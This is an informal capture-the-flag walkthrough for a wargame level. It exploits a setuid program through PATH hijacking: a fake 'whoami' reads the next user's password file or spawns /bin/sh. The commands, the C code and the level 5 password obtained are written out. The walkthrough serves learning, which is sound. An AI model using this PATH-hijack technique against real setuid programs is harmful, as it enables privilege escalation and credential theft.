Level 4 needs knowledge of how piping works.

Running the programme once we know that it prints "Welcome level5"
This means it has direct access to level 5 user

Seeing the code there is nothing we can change besides whoami which if changed to read level5 pass can give us access.

Now when a unix command is run the program scans through the directories listed in $PATH variable from left to right.

Also we can change the $PATH variable and add directories to it without root access.

To see path type:-

level4@io:/levels$ echo $PATH
/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
level4@io:/levels$

now go to tmp directory and create a folder inside which make a file named whoami and run command

echo -e '#!/bin/bash\n cat /home/level5/.pass' > whoami


NOW change its permissions

chmod 777 whoami

now try running it we get permission denied which means its working

now go to /levels

now input command

export PATH=/tmp/<your_folder>:$PATH
OR
export PATH=/tmp

now echo $PATH we see that our directory has been added to $PATH at the leftmost position

now run ./level04

But this is not working as it gives unreadable output ("Welcome ")

So we need to change the code in whoami

No we will try to get the shell running

open whoami in vim

add code as below

#include<stdlib.h>
main(){
    system("/bin/sh");
    return 0;
    }
    
Now compile it(after changina name to whoami.c)

Change name of a.out to whoami
 
NOw run /levels/level04

VIOLA we get shell

-------------------------------------------------

OPTIONAL

-------------------------------------------------
script can also be

#include<stdlib.h>
main(){
    system("cat /home/level5/.pass");
    return 0;
    } 
    
this will directly give password

now try and run ./level04
OUTPUT = level4@io:/tmp/lolol$ /levels/level04
Welcome LOoCy5PbKi63qXTh


level 5 pass == LOoCy5PbKi63qXTh
